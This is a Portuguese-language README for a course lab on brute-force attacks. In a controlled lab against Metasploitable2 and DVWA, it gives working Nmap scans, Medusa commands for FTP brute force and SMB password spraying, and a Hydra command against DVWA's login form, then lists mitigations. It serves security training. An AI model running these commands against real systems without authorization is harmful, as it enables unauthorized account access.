# Projeto Medusa Kali Linux — Laboratório de Ataques de Força Bruta


## Aviso Legal

Todos os testes descritos neste projeto foram realizados **somente em ambiente controlado** (Kali Linux + Metasploitable2/DVWA). Não tente executar esses comandos em sistemas sem autorização.

---

## 🎯 Objetivo do  repositório?

Simular ataques de força bruta em serviços comuns (FTP, SMB e formulários web) utilizando **Kali Linux**, **Medusa** e **Hydra**, documentando os testes e propondo medidas de mitigação.

---

## Ambiente de Teste

* **VM Atacante:** Kali Linux
* **VM Alvo:** Metasploitable2 / DVWA
* **IP da VM alvo:** `192.168.56.101`
* **Rede:** Host-Only/Internal Network
* **Estrutura de pastas do projeto:**

```
README.md
/images/
/wordlists/
/scripts/
/reports/
```

---

## Ferramentas

* Kali Linux
* Medusa (ftp, smbnt)
* Hydra (formulário web)
* Nmap


---

## Wordlists

* `wordlists/users.txt` — exemplo: admin, user, test, ftp, guest
* `wordlists/passwords.txt` — exemplo: 123456, password, admin, toor, welcome

---

## 1) Enumeração (Nmap)

```bash
sudo nmap -sS -sV -p 21,22,23,80,139,445,8080 -T4 -oN reports/nmap_quick_192.168.56.101.txt 192.168.56.101
sudo nmap -sS -sV -p- -T4 -oN reports/nmap_full_192.168.56.101.txt 192.168.56.101
```

**Observação:** identifica serviços ativos e portas abertas.

---

## 2) Ataque FTP (Medusa)

```bash
medusa -M ftp -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -t 6 -f -O reports/medusa_ftp_192.168.56.101.txt
```

* `-f` interrompe ao encontrar credencial válida.
* Salvar evidências: `reports/medusa_ftp_192.168.56.101.txt`
* Screenshot: `images/02_medusa_ftp_found.png`

---

## 3) Password Spraying SMB (Medusa)

```bash
# Usuário único
medusa -M smbnt -h 192.168.56.101 -u administrator -P wordlists/passwords.txt -t 8 -O reports/medusa_smb_admin_192.168.56.101.txt

# Vários usuários
medusa -M smbnt -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -t 8 -O reports/medusa_smb_users_192.168.56.101.txt
```

* Evidência: arquivos em `reports/`
* Screenshot: `images/03_medusa_smb_result.png`

---

## 4) Brute Force em Formulário Web (DVWA) — Hydra

```bash
hydra -l admin -P wordlists/passwords.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Incorrect"
```

* Ajuste `F=Incorrect` conforme mensagem de erro do DVWA.
* Evidência: reports + screenshot `images/04_hydra_dvwa.png`

---

## 5) Evidências

* Logs: `/reports/` (usar `-O` ou `tee`)
* Capturas de tela: `/images/` com prefixos numéricos para organização
* Scripts de automação: `/scripts/`

---

## 6) Mitigações Recomendadas

**FTP:**

* Bloquear login anônimo
* Políticas de senha forte e bloqueio após N tentativas

**SMB:**

* Desabilitar SMBv1
* Logging e alertas para múltiplas tentativas
* MFA e políticas de senha

**Aplicações Web:**

* Proteção contra brute force (rate limiting, captcha, lockout)
* HTTPS e headers de segurança
* Validação e sanitização de entradas

---

## 7) Checklist de entrega

* [ ] Vídeo-aulas assistidas
* [ ] Snapshots das VMs
* [ ] Enumeração (Nmap) salva
* [ ] Ataques realizados (FTP, SMB, DVWA)
* [ ] Capturas de tela em `/images`
* [ ] README.md revisado
* [ ] Repositório GitHub criado e link pronto

---

## 8) Mensagens de commit sugeridas

* `feat: add initial lab structure and README`
* `test: add medusa ftp and smb test scripts`
* `docs: add final report and mitigation recommendations`

---

## 9) Próximos passos recomendados

* Expandir wordlists e reexecutar testes controlados
* Testar ferramentas alternativas e automações
* Gerar PDF a partir do Markdown para anexar ao repositório
